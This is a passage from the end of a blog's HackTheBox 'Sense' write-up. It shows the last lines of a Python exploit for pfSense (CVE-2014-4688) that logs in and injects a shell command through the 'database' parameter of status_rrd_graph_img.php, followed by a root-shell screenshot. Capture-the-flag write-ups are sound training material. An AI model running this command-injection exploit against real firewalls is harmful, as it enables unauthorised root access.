</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;__csrf_magic&#39;</span><span class="p">:</span><span class="n">csrf</span><span class="p">,</span> <span class="s1">&#39;usernamefld&#39;</span><span class="p">:</span><span class="n">args</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="s1">&#39;passwordfld&#39;</span><span class="p">:</span><span class="n">args</span><span class="o">.</span><span class="n">password</span><span class="p">,</span> <span class="s1">&#39;login&#39;</span><span class="p">:</span><span class="s1">&#39;Login&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;https://</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">rhost</span><span class="si">}</span><span class="s2">/index.php&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;LOGIN... </span><span class="si">{</span><span class="n">req</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Trying to exploit...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;https://</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">rhost</span><span class="si">}</span><span class="s2">/status_rrd_graph_img.php?database=queues;printf+&#39;</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#39;|sh&#34;</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;If you see this, it&#39;s doesn&#39;t work!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">(</span><span class="ne">KeyboardInterrupt</span><span class="p">,</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">ConnectionError</span><span class="p">)</span> <span class="k">as</span> <span class="n">Error</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="/posts/htb/sense/root.png" title="shell as root" data-thumbnail="/posts/htb/sense/root.png" data-sub-html="<h2>shell as root</h2><p>shell as root</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/posts/htb/sense/root.png"
            data-srcset="/posts/htb/sense/root.png, /posts/htb/sense/root.png 1.5x, /posts/htb/sense/root.png 2x"
            data-sizes="auto"
            alt="/posts/htb/sense/root.png" width="860" height="477" />
    </a><figcaption class="image-caption">shell as root</figcaption>
    </figure></p>
<p>BOOM! root baby! this is because firewall applications tend to be installed under root privilege.</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 13-11-2022</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://shafiqaiman.com/posts/htb/sense/" data-title="HackTheBox - Sense Writeup" data-via="_shafiqaiman_" data-hashtags="CVE-2014-4688,pfsense-default-creds,pfsense,gobuster,python,rce"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://shafiqaiman.com/posts/htb/sense/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://shafiqaiman.com/posts/htb/sense/" data-title="HackTheBox - Sense Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://shafiqaiman.com/posts/htb/sense/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/cve-2014-4688/">CVE-2014-4688</a>,&nbsp;<a href="/tags/pfsense-default-creds/">pfsense-default-creds</a>,&nbsp;<a href="/tags/pfsense/">pfsense</a>,&nbsp;<a href="/tags/gobuster/">gobuster</a>,&nbsp;<a href="/tags/python/">python</a>,&nbsp;<a href="/tags/rce/">rce</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/htb/mirai/" class="prev" rel="prev" title="HackTheBox - Mirai Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Mirai Writeup</a>
            <a href="/posts/htb/busqueda/" class="next" rel="next" title="HackTheBox - Busqueda Writeup">HackTheBox - Busqueda Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
